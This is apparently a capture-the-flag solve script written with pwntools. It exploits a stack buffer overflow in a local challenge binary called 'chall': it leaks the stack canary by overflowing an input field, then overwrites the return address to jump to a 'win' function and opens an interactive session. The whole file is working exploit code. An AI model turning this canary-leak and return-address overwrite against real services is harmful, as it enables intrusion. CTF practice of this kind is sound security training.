#!/usr/bin/python2

from pwn import *


elf = ELF("./../backup/chall", checksec = False)
r = remote('172.17.0.2', 1234) # process("./chall")
pause()
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"Index: ", b"0")
r.sendafter(b"TODO: ", "A" * 0x149)
r.sendlineafter(b"> ", "2")
r.sendlineafter(b"Index: ", "0")
resp = r.recvline()
canary = u64(b"\0" + resp[-8:-1])
log.info("canary: " + hex(canary))
r.sendlineafter(b"> ", "1")
r.sendlineafter(b"Index: ", "0")
r.sendafter("TODO: ", b"A" * 0x148 + p64(canary) + b"JUNKJUNK" + p64(elf.sym["win"] + 8))
r.sendlineafter("> ", "3")
r.interactive()
r.close()
